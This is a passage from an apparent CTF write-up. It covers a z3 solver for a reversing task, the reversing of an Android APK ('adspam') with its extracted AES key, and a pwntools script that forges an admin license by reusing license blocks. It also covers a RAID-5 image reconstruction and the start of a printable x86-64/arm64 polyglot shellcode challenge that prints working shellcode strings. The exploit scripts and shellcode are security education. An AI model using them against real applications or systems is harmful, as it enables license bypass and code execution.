<span class="hljs-attribute">t1</span> = <span class="hljs-number">1</span>

<span class="hljs-attribute">if</span> (t<span class="hljs-number">1</span> &amp; (<span class="hljs-number">2</span>**<span class="hljs-number">6</span>) != <span class="hljs-number">0</span>):
  <span class="hljs-attribute">a</span> += <span class="hljs-number">0</span>x<span class="hljs-number">7</span>A<span class="hljs-number">024204</span>
  <span class="hljs-attribute">a</span> = -<span class="hljs-number">1</span> - a
<span class="hljs-attribute">else</span>:
  <span class="hljs-attribute">a</span> += <span class="hljs-number">0</span>xA<span class="hljs-number">5</span>D<span class="hljs-number">2</span>F<span class="hljs-number">34</span>
  <span class="hljs-attribute">a</span> = -<span class="hljs-number">1</span> - a 
<span class="hljs-attribute">a</span> = <span class="hljs-number">0</span>x<span class="hljs-number">6</span>F<span class="hljs-number">67202</span>A ^ a


<span class="hljs-comment"># hex2</span>

<span class="hljs-attribute">t1</span> = <span class="hljs-number">6</span>
<span class="hljs-attribute">if</span> (t<span class="hljs-number">1</span> &amp; (<span class="hljs-number">2</span>**<span class="hljs-number">3</span>) != <span class="hljs-number">0</span>):
  <span class="hljs-attribute">b</span> ^= <span class="hljs-number">0</span>xE<span class="hljs-number">6</span>F<span class="hljs-number">4590</span>B
  <span class="hljs-attribute">b</span> += <span class="hljs-number">0</span>x<span class="hljs-number">5487</span>CE<span class="hljs-number">1</span>E
<span class="hljs-attribute">else</span>:
  <span class="hljs-attribute">b</span> = <span class="hljs-number">0</span>xffffffff - b
  <span class="hljs-attribute">b</span> ^= <span class="hljs-number">0</span>x<span class="hljs-number">48268673</span>
<span class="hljs-attribute">b</span> = <span class="hljs-number">0</span>x<span class="hljs-number">656</span>C<span class="hljs-number">676</span>F ^ b



<span class="hljs-comment"># hex3</span>

<span class="hljs-attribute">t1</span> = <span class="hljs-number">0</span>xF
<span class="hljs-attribute">r0</span> = <span class="hljs-number">0</span>x<span class="hljs-number">6</span>E<span class="hljs-number">696220</span>
<span class="hljs-attribute">if</span> (t<span class="hljs-number">1</span> &amp; (<span class="hljs-number">2</span>**<span class="hljs-number">8</span>) != <span class="hljs-number">0</span>):
  <span class="hljs-attribute">r0</span> = <span class="hljs-number">0</span>xffffffff - r<span class="hljs-number">0</span>
  <span class="hljs-attribute">r0</span> += <span class="hljs-number">0</span>x<span class="hljs-number">85776</span>E<span class="hljs-number">9</span>A
<span class="hljs-attribute">else</span>:
  <span class="hljs-attribute">r0</span> ^= <span class="hljs-number">0</span>x<span class="hljs-number">5</span>A<span class="hljs-number">921187</span>
  <span class="hljs-attribute">r0</span> += <span class="hljs-number">0</span>xE<span class="hljs-number">9</span>BB<span class="hljs-number">17</span>BC
<span class="hljs-attribute">r0</span> = r<span class="hljs-number">0</span> ^ b
<span class="hljs-attribute">an</span> = b
<span class="hljs-attribute">bn</span> = r<span class="hljs-number">0</span> ^ a
<span class="hljs-attribute">a</span> = an
<span class="hljs-attribute">b</span> = bn


<span class="hljs-comment"># hex4</span>


<span class="hljs-attribute">t1</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1</span>C
<span class="hljs-attribute">r0</span> = <span class="hljs-number">0</span>x<span class="hljs-number">682</span>D<span class="hljs-number">616</span>A
<span class="hljs-attribute">if</span> (t<span class="hljs-number">1</span> &amp; (<span class="hljs-number">2</span>**<span class="hljs-number">0</span>) != <span class="hljs-number">0</span>):
  <span class="hljs-attribute">r0</span> = <span class="hljs-number">0</span>xffffffff - r<span class="hljs-number">0</span>
  <span class="hljs-attribute">r0</span> = <span class="hljs-number">0</span>xffffffff - r<span class="hljs-number">0</span>
<span class="hljs-attribute">else</span>:
  <span class="hljs-attribute">r0</span> = <span class="hljs-number">0</span>xffffffff - r<span class="hljs-number">0</span>
  <span class="hljs-attribute">r0</span> ^= <span class="hljs-number">0</span>xD<span class="hljs-number">71037</span>D<span class="hljs-number">1</span>
<span class="hljs-attribute">r0</span> = r<span class="hljs-number">0</span> ^ b
<span class="hljs-attribute">an</span> = b
<span class="hljs-attribute">bn</span> = r<span class="hljs-number">0</span> ^ a
<span class="hljs-attribute">a</span> = an
<span class="hljs-attribute">b</span> = bn


<span class="hljs-comment"># hex5</span>

<span class="hljs-attribute">t1</span> = <span class="hljs-number">0</span>x<span class="hljs-number">2</span>D
<span class="hljs-attribute">r0</span> = <span class="hljs-number">0</span>x<span class="hljs-number">67617865</span>
<span class="hljs-attribute">if</span> (t<span class="hljs-number">1</span> &amp; (<span class="hljs-number">2</span>**<span class="hljs-number">0</span>) != <span class="hljs-number">0</span>):
  <span class="hljs-attribute">r0</span> = <span class="hljs-number">0</span>xffffffff - r<span class="hljs-number">0</span>
  <span class="hljs-attribute">r0</span> += <span class="hljs-number">0</span>x<span class="hljs-number">101</span>FBCCC
<span class="hljs-attribute">else</span>:
  <span class="hljs-attribute">r0</span> = <span class="hljs-number">0</span>xffffffff - r<span class="hljs-number">0</span>
  <span class="hljs-attribute">r0</span> += <span class="hljs-number">0</span>x<span class="hljs-number">55485822</span>
<span class="hljs-attribute">r0</span> = r<span class="hljs-number">0</span> ^ b
<span class="hljs-attribute">an</span> = b
<span class="hljs-attribute">bn</span> = r<span class="hljs-number">0</span> ^ a
<span class="hljs-attribute">a</span> = an
<span class="hljs-attribute">b</span> = bn

<span class="hljs-comment"># hex6</span>

<span class="hljs-attribute">t1</span> = <span class="hljs-number">0</span>x<span class="hljs-number">42</span>
<span class="hljs-attribute">r0</span> = <span class="hljs-number">0</span>x<span class="hljs-number">2</span>A<span class="hljs-number">206</span>E<span class="hljs-number">6</span>F
<span class="hljs-attribute">if</span> (t<span class="hljs-number">1</span> &amp; (<span class="hljs-number">2</span>**<span class="hljs-number">3</span>) != <span class="hljs-number">0</span>):
  <span class="hljs-attribute">r0</span> ^= <span class="hljs-number">0</span>x<span class="hljs-number">49</span>A<span class="hljs-number">3</span>E<span class="hljs-number">80</span>E
  <span class="hljs-attribute">r0</span> ^= <span class="hljs-number">0</span>x<span class="hljs-number">6288</span>E<span class="hljs-number">1</span>A<span class="hljs-number">5</span>
<span class="hljs-attribute">else</span>:
  <span class="hljs-attribute">r0</span> ^= <span class="hljs-number">0</span>x<span class="hljs-number">8</span>B<span class="hljs-number">0163</span>C<span class="hljs-number">1</span>
  <span class="hljs-attribute">r0</span> ^= <span class="hljs-number">0</span>xEECE<span class="hljs-number">328</span>B
<span class="hljs-attribute">r0</span> = r<span class="hljs-number">0</span> ^ b
<span class="hljs-attribute">an</span> = b
<span class="hljs-attribute">bn</span> = r<span class="hljs-number">0</span> ^ a
<span class="hljs-attribute">a</span> = an
<span class="hljs-attribute">b</span> = bn

<span class="hljs-attribute">s</span>.add(a == u<span class="hljs-number">32</span>(newTarget[:<span class="hljs-number">4</span>]))
<span class="hljs-attribute">s</span>.add(b == u<span class="hljs-number">32</span>(newTarget[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))




<span class="hljs-attribute">print</span> s.check()
<span class="hljs-attribute">print</span> s.model()
<span class="hljs-comment">#print hex(s.model()[BitVec(&#x27;a&#x27;,32)].as_long())</span>
<span class="hljs-attribute">print</span> p<span class="hljs-number">64</span>(s.model()[x].as_long())
<span class="hljs-attribute">print</span> p<span class="hljs-number">64</span>(s.model()[y].as_long())

<span class="hljs-comment"># the flag is CTF{IDigVLIW}</span>
</code></pre><h3 id="adspam"><a class="header-link" href="#adspam"></a>adspam</h3>
<ul class="list">
<li>It&#39;s a apk reverse challenge.</li>
<li>The commucation between client and server is encrypted. We need to reverse libnative-lib.so first.</li>
<li>encrypt(), decrypt() and declicstr() are our targets.</li>
<li>encrypt() and decrypt() use AES-ECB encryption. The key is <code>eaW~IFhnvlIoneLl</code></li>
<li>declicstr() is a RSA-decryption function. We can also find the key in libnative-lib.so</li>
<li>encrypt() and decrypt() are used in the communication. declicstr() is used to decrypt license strings.</li>
<li>After reversing the apk, I found that we need to send a json-like message like this to the server</li>
</ul>
<pre class="hljs"><code>{
    <span class="hljs-attr">&quot;license&quot;</span>:$license,
    <span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;Balsn&quot;</span>,
    <span class="hljs-attr">&quot;is_admin&quot;</span>:<span class="hljs-number">0</span>,
    <span class="hljs-attr">&quot;device_info&quot;</span>:{<span class="hljs-attr">&quot;os_version&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-attr">&quot;api_level&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;device&quot;</span>:<span class="hljs-string">&quot;blabla&quot;</span>}
}
</code></pre><ul class="list">
<li>It&#39;s obvious that changing <code>is_admin</code> to 1 should solve this challenge.</li>
<li><code>license</code> is a rsa-encrypted string which contains <code>name</code> and <code>is_admin</code>. Unfortunately, we cannot forge a license since we only got the decryption key.</li>
<li>There are some example license strings lying in <code>app-release/res/raw/lic</code>. We cannot forge a license string. But we can reuse them!</li>
<li>The following are the license strings we have</li>
</ul>
<pre class="hljs"><code>QIknTsIjeUEF9yJjeZ<span class="hljs-regexp">/kPPfTlSm8vzMU4LWjzfSXvN+OSqBu3iNgZJgeW7fc8oltH9MprO9nI8vxgsjO/</span>VA4t7YuNm16a7elPVAHqD4dXtzngnZPpsbek3Rc<span class="hljs-regexp">/We/</span>WQ5YxXHgUt7YJ6tcd4wH3fhduC9tl<span class="hljs-regexp">/E5elwJL/</span>YAcbD4mT8=
\x0b133
o9kjqYWCBKMgodl1JvDiscUeRjh9Ip9HcC7tHskoYqNQfAPE0XvSAKBSOFgleNHzVY9BVkfxmutgn<span class="hljs-regexp">/kVXUs3yl/</span>qAurc4jokg0eA/v3flnnkWxqTOh4vv0yfr7PGXqwHk4qUFK1SldZ4VsLhd8PAb0aHj22E5b4U5jeJ16z187E=
<span class="hljs-number">7</span>_ha
gpDbCb0BmUZfdKVIZgF08lQ80K9SeUsRadZG+UUjE7wI1NRZ1evLk2GQ3sqskGHFKlPg8cTR2Xy69WedNu4QLboOWm<span class="hljs-regexp">/w13ocOvHwCoiQ1ZdmibgnhMQBznqpjpBnL083YMRYskcUX68R2PFaXY3taV7MoG1DyQWFRfdr/</span>CnLyS8=
cker
ZBLhwMu0DbgpUANm2ukYldrppJERiH1Tgp02CRB5I4dDP8n4+ZCv33ScspELtgAKHhiwIVksQVsnwDLsQRi6nqq9nrIwqSHMR0TwOe6UKTpAegbH53FXtriopPHfLuI2M45SzJ88GFjXy7wfOOjwDYe4KKO9KU8+LGD15Au73EM=
<span class="hljs-variable">$798</span>
Hygv+bTtsnI9IBf44GkvoF38r3g5zBB7uyYT7PTlbjhCdgYRwRayutI3vY+n66xM7GOFgUFVIBI5+OBDnvazLNttjGomPED<span class="hljs-regexp">/OXlImndWvrZxYcaKaE3vYGPezorV0xwPahGGq/</span>DWafPKdYxLxwICq1GXKYNAckCZIqfpGbJRRwg=
b7dd
GARMZAX7fQN7i7Wnp4J6HxMTLe9+VM/wGJs+zN6b9IOmynh2gIkGjmssfOA9KdYydqBLEOJymayH8HeyrtInhhQNR3el8A5n8GMEMkyF1gUFAiSEPyhNeWWOj2IAHGNNwccmF7QywdfOUGjsTNFbrW6Yl5QLLAmMbA95qF0IERk=
<span class="hljs-number">4</span>-d1
YWlx8Cok1x/<span class="hljs-number">3</span>ZsW9JKIsKj9UpBaCNkXSPiVXUrNX1IDZE0B8iNr3iliOr90TW0BvsIaFEwvDTlcESXJ8kLc3iZq0fm1lgujfM7Z156VdxEPjr9LplcEZ9ZVhYGNtVyGIRcouUDJHu3FVfXQ1XesaNlNHOb50hADprsw3RnTAGbU=
<span class="hljs-number">71</span>-<span class="hljs-number">1</span>
I3dsx2vSfXxZ1<span class="hljs-regexp">/QlMbwYPRFEZBtOuB8qLEY8cqFVtYjMluNWSkbHAYB+kwCBEv3yuoOjkdQEfqq4pS+K0ka1+pFDyss8sSbV3OiZdpRf40SS/</span>pZxw2duJr9uDd1DdX8mST7fdjqj0V1a2ZBMpqaEI2gFlCwzXlfZBC47LKNiM+<span class="hljs-number">8</span>=
<span class="hljs-number">1</span>eb-
ow7r5VJMGfSf0odNKxzBpUtSJdj8gHdt+Z7Xu54MAdsnUParSjrtRI4yJYzcW4toOFmDdSs5SERR289yohYI5hHSWLElv<span class="hljs-regexp">/44O+g4M08F5qpwCmOp5otW32qRG1RnhqR95evH44nOyK24UnpvWlebNwVhniSu4A7znjluGRrao/</span>U=
<span class="hljs-number">5149</span>
TeGqGWv8ZmsY<span class="hljs-regexp">/rFq1puW9N+01TWTKJm8qzUuY/</span><span class="hljs-number">7</span>JUCPDJ1AR6Y3XsPb73FuSVHPL63sjiuCTiKTRSUDzBE0VBfo59rtOKI05k64Jrz88nODD7BiK7ssacsOr2dAFGQKgBaWV2jitSAdxtCmh9sDpYsfs0/vXBBfVLqfVZDfAVGQ=
-<span class="hljs-number">1</span>fa
Al3QWY+nNFoLezt+rSdbWmqp7iZ+rR9pnM35IJNZ63bLQeM3CUvULVczhrM3toXNLCY7xmAT4jg+u0uDAjanaKMB+T1Tmym7aaCqwCfHYVFn5nw+tw54e13CLxj7OO+e847+XH8DtK<span class="hljs-regexp">/BiA+n03vPnt/</span>cEDPvIM59sPsjHThJvpk=
<span class="hljs-number">5960</span>
VOGr60qxiO1r0YlKnrIWbQu7UhBmtBeNw2NDQnoNU3H1mjVEs<span class="hljs-regexp">/ji3AYuEGc2HGKINByq7Mpb4mWKD2oH5ii/</span>UZDpxbzCFlJrjvjEG25c9Hhf2fiQHvRXmJd8iA8YdffBii3csCjaydLFSX6Vn7XPg+<span class="hljs-regexp">/PF/</span>TdM1zUiLTJZX4LXRw=
<span class="hljs-number">3</span>ced
ELL9maLDpdmmEgaT76qtw9IugtaQX2r7V7QVqMKXQcbwq7o0dvaO3+yMt6m5K5Milm4JSNwX/<span class="hljs-number">810</span>YUaoAsHNuaIavuLRsxbP3b6KnKxaKz3EDgyhye2en3U1EZouiLljBB0bKz8rAtyGdolWDdNoKjvLhv7x2edc05HQZOt3aiA= <span class="hljs-number">5</span>\x010\x00

<span class="hljs-string">&#x27;\x0b1337_hacker$798b7dd4-d171-11eb-5149-1fa59603ced5\x010\x00&#x27;</span>

</code></pre><ul class="list">
<li>We can build a license string like this <code>\x0b1337_hacker$798b7dd4-d171-11eb-5149-1fa59603ced514951495149514951495149514951495149514951495149</code> which will make is_admin non-zero. And we got the flag!</li>
</ul>
<p>aes.py</p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python2</span>

from Crypto.Cipher <span class="hljs-built_in">import</span> AES
<span class="hljs-built_in">import</span> base64

<span class="hljs-attr">BLOCK_SIZE_16</span> =  AES.block_size
def decrypt(enStr, key):
   <span class="hljs-attr">cipher</span> = AES.new(key, AES.MODE_ECB)
   <span class="hljs-attr">decryptByts</span> = base64.b64decode(enStr)
   <span class="hljs-attr">msg</span> = cipher.decrypt(decryptByts)
   return msg

def encrypt(enStr, key):
   <span class="hljs-attr">cipher</span> = AES.new(key, AES.MODE_ECB)
   <span class="hljs-attr">x</span> = BLOCK_SIZE_16 - (len(enStr) % BLOCK_SIZE_16)
   <span class="hljs-keyword">if</span> x != <span class="hljs-number">0</span>:
      <span class="hljs-attr">enStr</span> = enStr + chr(x)*x
   <span class="hljs-attr">msg</span> = cipher.encrypt(enStr)
   <span class="hljs-attr">msg</span> = base64.b64encode(msg)
   return msg

</code></pre><p>ans.py</p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python2</span>

<span class="hljs-keyword">import</span> aes
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

r = remote(<span class="hljs-string">&quot;adspam.2021.ctfcompetition.com&quot;</span>, <span class="hljs-number">1337</span>)

key = <span class="hljs-string">&#x27;eaW~IFhnvlIoneLl&#x27;</span>
r.recvuntil(<span class="hljs-string">&#x27;== proof-of-work: disabled ==\n&#x27;</span>)

license = <span class="hljs-string">&quot;QIknTsIjeUEF9yJjeZ/kPPfTlSm8vzMU4LWjzfSXvN+OSqBu3iNgZJgeW7fc8oltH9MprO9nI8vxgsjO/VA4t7YuNm16a7elPVAHqD4dXtzngnZPpsbek3Rc/We/WQ5YxXHgUt7YJ6tcd4wH3fhduC9tl/E5elwJL/YAcbD4mT8=::o9kjqYWCBKMgodl1JvDiscUeRjh9Ip9HcC7tHskoYqNQfAPE0XvSAKBSOFgleNHzVY9BVkfxmutgn/kVXUs3yl/qAurc4jokg0eA/v3flnnkWxqTOh4vv0yfr7PGXqwHk4qUFK1SldZ4VsLhd8PAb0aHj22E5b4U5jeJ16z187E=::gpDbCb0BmUZfdKVIZgF08lQ80K9SeUsRadZG+UUjE7wI1NRZ1evLk2GQ3sqskGHFKlPg8cTR2Xy69WedNu4QLboOWm/w13ocOvHwCoiQ1ZdmibgnhMQBznqpjpBnL083YMRYskcUX68R2PFaXY3taV7MoG1DyQWFRfdr/CnLyS8=::ZBLhwMu0DbgpUANm2ukYldrppJERiH1Tgp02CRB5I4dDP8n4+ZCv33ScspELtgAKHhiwIVksQVsnwDLsQRi6nqq9nrIwqSHMR0TwOe6UKTpAegbH53FXtriopPHfLuI2M45SzJ88GFjXy7wfOOjwDYe4KKO9KU8+LGD15Au73EM=::Hygv+bTtsnI9IBf44GkvoF38r3g5zBB7uyYT7PTlbjhCdgYRwRayutI3vY+n66xM7GOFgUFVIBI5+OBDnvazLNttjGomPED/OXlImndWvrZxYcaKaE3vYGPezorV0xwPahGGq/DWafPKdYxLxwICq1GXKYNAckCZIqfpGbJRRwg=::GARMZAX7fQN7i7Wnp4J6HxMTLe9+VM/wGJs+zN6b9IOmynh2gIkGjmssfOA9KdYydqBLEOJymayH8HeyrtInhhQNR3el8A5n8GMEMkyF1gUFAiSEPyhNeWWOj2IAHGNNwccmF7QywdfOUGjsTNFbrW6Yl5QLLAmMbA95qF0IERk=::YWlx8Cok1x/3ZsW9JKIsKj9UpBaCNkXSPiVXUrNX1IDZE0B8iNr3iliOr90TW0BvsIaFEwvDTlcESXJ8kLc3iZq0fm1lgujfM7Z156VdxEPjr9LplcEZ9ZVhYGNtVyGIRcouUDJHu3FVfXQ1XesaNlNHOb50hADprsw3RnTAGbU=::I3dsx2vSfXxZ1/QlMbwYPRFEZBtOuB8qLEY8cqFVtYjMluNWSkbHAYB+kwCBEv3yuoOjkdQEfqq4pS+K0ka1+pFDyss8sSbV3OiZdpRf40SS/pZxw2duJr9uDd1DdX8mST7fdjqj0V1a2ZBMpqaEI2gFlCwzXlfZBC47LKNiM+8=::ow7r5VJMGfSf0odNKxzBpUtSJdj8gHdt+Z7Xu54MAdsnUParSjrtRI4yJYzcW4toOFmDdSs5SERR289yohYI5hHSWLElv/44O+g4M08F5qpwCmOp5otW32qRG1RnhqR95evH44nOyK24UnpvWlebNwVhniSu4A7znjluGRrao/U=::TeGqGWv8ZmsY/rFq1puW9N+01TWTKJm8qzUuY/7JUCPDJ1AR6Y3XsPb73FuSVHPL63sjiuCTiKTRSUDzBE0VBfo59rtOKI05k64Jrz88nODD7BiK7ssacsOr2dAFGQKgBaWV2jitSAdxtCmh9sDpYsfs0/vXBBfVLqfVZDfAVGQ=::Al3QWY+nNFoLezt+rSdbWmqp7iZ+rR9pnM35IJNZ63bLQeM3CUvULVczhrM3toXNLCY7xmAT4jg+u0uDAjanaKMB+T1Tmym7aaCqwCfHYVFn5nw+tw54e13CLxj7OO+e847+XH8DtK/BiA+n03vPnt/cEDPvIM59sPsjHThJvpk=::VOGr60qxiO1r0YlKnrIWbQu7UhBmtBeNw2NDQnoNU3H1mjVEs/ji3AYuEGc2HGKINByq7Mpb4mWKD2oH5ii/UZDpxbzCFlJrjvjEG25c9Hhf2fiQHvRXmJd8iA8YdffBii3csCjaydLFSX6Vn7XPg+/PF/TdM1zUiLTJZX4LXRw=::ow7r5VJMGfSf0odNKxzBpUtSJdj8gHdt+Z7Xu54MAdsnUParSjrtRI4yJYzcW4toOFmDdSs5SERR289yohYI5hHSWLElv/44O+g4M08F5qpwCmOp5otW32qRG1RnhqR95evH44nOyK24UnpvWlebNwVhniSu4A7znjluGRrao/U=::&quot;</span>

<span class="hljs-comment"># k = 5149</span>

k = <span class="hljs-string">&quot;ow7r5VJMGfSf0odNKxzBpUtSJdj8gHdt+Z7Xu54MAdsnUParSjrtRI4yJYzcW4toOFmDdSs5SERR289yohYI5hHSWLElv/44O+g4M08F5qpwCmOp5otW32qRG1RnhqR95evH44nOyK24UnpvWlebNwVhniSu4A7znjluGRrao/U=::&quot;</span>

license += k*<span class="hljs-number">12</span>

payload=<span class="hljs-string">&#x27;&#x27;&#x27;
  {&quot;license&quot;:&quot;%s&quot;,&quot;name&quot;:&quot;1337_hacker&quot;}
&#x27;&#x27;&#x27;</span> %  (license)

r.sendline(aes.encrypt(payload,key))

a = r.recvline()
<span class="hljs-built_in">print</span> a
<span class="hljs-built_in">print</span> aes.decrypt(a,key)
r.interactive()

<span class="hljs-comment"># the flag is CTF{n0w_u_kn0w_h0w_n0t_t0_l1c3n53_ur_b0t}</span>
</code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
<h3 id="raiders-of-corruption"><a class="header-link" href="#raiders-of-corruption"></a>RAIDERS OF CORRUPTION</h3>
<ul class="list">
<li>It&#39;s a raid challenge. we are given ten raid-5 images</li>
</ul>
<pre class="hljs"><code>$ file disk01.img 
disk01.img: Linux Software RAID version 1.2 (1) <span class="hljs-attribute">UUID</span>=ad89154a:f0c39ce3:99c46240:21b5e681 <span class="hljs-attribute">name</span>=0 <span class="hljs-attribute">level</span>=5 <span class="hljs-attribute">disks</span>=10
</code></pre><ul class="list">
<li>But the device roles are cleared</li>
</ul>
<pre class="hljs"><code>$ mdadm <span class="hljs-comment">--misc --examine ./disk01.img </span>
./disk01.img:
          Magic : <span class="hljs-type">a92b4efc</span>
        Version : 1.2
    Feature Map : 0<span class="hljs-type">x0</span>
     <span class="hljs-keyword">Array</span> UUID : <span class="hljs-type">ad89154a</span>:f0c39ce3:<span class="hljs-number">99</span>c46240:<span class="hljs-number">21</span>b5e681
           Name : 0
  Creation Time : <span class="hljs-type">Wed</span> Apr <span class="hljs-number">28</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span> <span class="hljs-number">2021</span>
     Raid Level : <span class="hljs-type">raid5</span>
   Raid Devices : 10

 Avail Dev Size : 8192
     <span class="hljs-keyword">Array</span> Size : 36864 (36.00 <span class="hljs-type">MiB</span> <span class="hljs-number">37.75</span> MB)
    Data Offset : 2048 <span class="hljs-type">sectors</span>
   Super Offset : 8 <span class="hljs-type">sectors</span>
   Unused Space : <span class="hljs-type">before</span>=<span class="hljs-number">1968</span> sectors, after=<span class="hljs-number">0</span> sectors
          State : <span class="hljs-type">active</span>
    Device UUID : <span class="hljs-type">c0e88e3c</span>:<span class="hljs-number">62</span>aaf6ff:d701e002:d4be4142

    Update Time : <span class="hljs-type">Wed</span> Apr <span class="hljs-number">28</span> <span class="hljs-number">15</span>:<span class="hljs-number">11</span>:<span class="hljs-number">16</span> <span class="hljs-number">2021</span>
  Bad Block Log : 512 <span class="hljs-type">entries</span> available <span class="hljs-keyword">at</span> offset <span class="hljs-number">16</span> sectors
       Checksum : <span class="hljs-type">dbf6b2c8</span> - correct
         Events : 18

         Layout : <span class="hljs-type">left</span>-symmetric
     Chunk Size : 4<span class="hljs-type">K</span>

   Device Role : <span class="hljs-type">spare</span>
   <span class="hljs-keyword">Array</span> State : <span class="hljs-type">AAAAAAAAAA</span> (<span class="hljs-string">&#x27;A&#x27;</span> == active, <span class="hljs-string">&#x27;.&#x27;</span> == missing, <span class="hljs-string">&#x27;R&#x27;</span> == replacing)

</code></pre><ul class="list">
<li>We need to figure out the order of these ten images</li>
<li>Fortunately, We can find some plaintext in these images.</li>
<li>Those images contain some <a href="https://www.infoplease.com/primary-sources/books-plays/william-shakespeare/william-shakespeare-romeo-and-juliet-act-i-scene-ii">scripts</a> which can help us find the order.</li>
<li>Then I manually concatenate those images. Use <code>foremost</code> to get the <code>flag.jpg</code></li>
</ul>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python2</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

raid = []


o = [<span class="hljs-string">&quot;03&quot;</span>,
 <span class="hljs-string">&quot;05&quot;</span>,
 <span class="hljs-string">&quot;02&quot;</span>,
 <span class="hljs-string">&quot;08&quot;</span>,
 <span class="hljs-string">&quot;09&quot;</span>,
 <span class="hljs-string">&quot;10&quot;</span>,
 <span class="hljs-string">&quot;01&quot;</span>,
 <span class="hljs-string">&quot;07&quot;</span>,
 <span class="hljs-string">&quot;04&quot;</span>,
 <span class="hljs-string">&quot;06&quot;</span>
]

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
  a = <span class="hljs-string">&quot;disk%s.img&quot;</span> % o[i]
  f = <span class="hljs-built_in">open</span>(a).read()
  raid.append(f[<span class="hljs-number">0x100000</span>:])

s = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x400000</span>/<span class="hljs-number">0x1000</span>):
  p = <span class="hljs-number">9</span> - ((i+<span class="hljs-number">4</span>)%<span class="hljs-number">10</span>)
  <span class="hljs-comment">#print o[p], hex(0x100000+i*0x1000)</span>
  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
    <span class="hljs-keyword">if</span> j==p:
      <span class="hljs-keyword">continue</span>
    s+=raid[j][i*<span class="hljs-number">0x1000</span>: (i+<span class="hljs-number">1</span>)*<span class="hljs-number">0x1000</span>]
    
<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(s)
</code></pre><p class="img-container"><img src="https://i.imgur.com/ukL0lqR.jpg" alt=""></p>
<h3 id="abc-arm-and-amd"><a class="header-link" href="#abc-arm-and-amd"></a>ABC ARM AND AMD</h3>
<h4 id="goal"><a class="header-link" href="#goal"></a>Goal</h4>
<p>The goal of this challenge is to provide a printable shellcode (which can only contain byte from <code>0x20</code> to <code>0x7f</code>) that can print out the content of file <code>flag</code> in both <code>x86-64</code> and <code>arm64v8</code> and the length of shellcode must not exceed 280 bytes.</p>
<h4 id="instruction-orr-vs-jge"><a class="header-link" href="#instruction-orr-vs-jge"></a>Instruction <code>orr</code> vs <code>jge</code></h4>
<p>Inspired by this <a href="https://github.com/ixty/xarch_shellcode/tree/master/stage0">GitHub repo</a>, we know that the first step is to use an instruction that acts as <code>nop</code> in architecture A and a <code>jmp</code> instruction in architecture B. Then, the instruction is ignored in architecture A and will jump to a different section in architecture B. The layout of our shellcode looks like this:</p>
<pre class="hljs"><code>    +-------------+
    |<span class="hljs-string">   nop/jmp   </span>|
    +-------------+
    |<span class="hljs-string">             </span>|
    |<span class="hljs-string"> shellcode A </span>|
    |<span class="hljs-string">             </span>|
    +-------------+
    |<span class="hljs-string">             </span>|
    |<span class="hljs-string"> shellcode B </span>|
    |<span class="hljs-string">             </span>|
    +-------------+
</code></pre><p>As stated in the above GitHub repo, <code>\x7d\xXX\x20\x32</code> is a nice gadget as this instruction is <code>orr w29, w11, #0x3fff</code> in <code>arm64v8</code>, which acted as <code>nop</code> without any side effect, and <code>\x7d\xXX</code> is <code>jge 0xXX</code> in <code>x86-64</code>.</p>
<p>Thus, the first 4 bytes of our shellcode should be this gadget and create our <code>arm64v8</code> shellcode in <code>shellcode A</code> and <code>x86-64</code> shellcode in <code>shellcode B</code>.</p>
<p>Note that in our case, <code>arm64v8</code> shellcode has more than 0x80 bytes. We would have to split our <code>arm64v8</code> shellcode and jump twice so that in <code>x86-64</code> we can jump to the correct location. A revised version of the layout of our shellcode:</p>
<pre class="hljs"><code>    +---------------+
    |   <span class="hljs-built_in"> nop/jmp </span>   |
    +---------------+
    | shellcode arm |
    |   (part 1)    |
    +---------------+
    |   <span class="hljs-built_in"> nop/jmp </span>   |
    +---------------+
    | shellcode arm |
    |   (part 2)    |
    +---------------+
    | shellcode x64 |
    |               |
    +---------------+
</code></pre><h4 id="deal-with-familiar-architecture-first-x86-64"><a class="header-link" href="#deal-with-familiar-architecture-first-x86-64"></a>Deal with familiar architecture first! (<code>x86-64</code>)</h4>
<p><code>x86-64</code> architecture is a much more &quot;user-friendly&quot;(?) architecture that most of the people are already familiar with. We then create and make this shellcode as short as possible so that we can have more bytes available for <code>arm64v8</code> shellcode.</p>
<p>The first edition is length 90: <code>&#39;R[j3TYfi9WmWYAPX4\x7f0K&lt;0k?0kC0KD0KE0C@0CB0KO0KP0KR0KX0KYhflagjWXHAg1vQZPP_VXS^ASZZPjT_PZWXZP&#39;</code>. However, this shellcode is not easy to integrate due to fixed offset when self-modifying the shellcode.</p>
<p>Our second edition is length 88: <code>&#39;j3TYfi9WmWYX,wP[4&lt;0L3@0l3C0l3G0L3H0L3I0D3D0D3F0L3M0L3V0L3WhflagjWXHAg1vQZPP^jT_jTAZj(XZP&#39;</code>. This shellcode will be our draft for final payload.</p>
<h4 id="learning-arm64v8-shellcode"><a class="header-link" href="#learning-arm64v8-shellcode"></a>Learning <code>arm64v8</code> shellcode</h4>
<p>We never write <code>aarch64</code> shellcode before, so the first step is to create a simple straightforward &quot;orw&quot; (stands for Open, Read, Write) shellcode. We used <code>pwntools</code> library and print out the assembly of <code>shellcraft.cat(&#39;flag&#39;)</code>.</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.arch = <span class="hljs-string">&#x27;aarch64&#x27;</span>
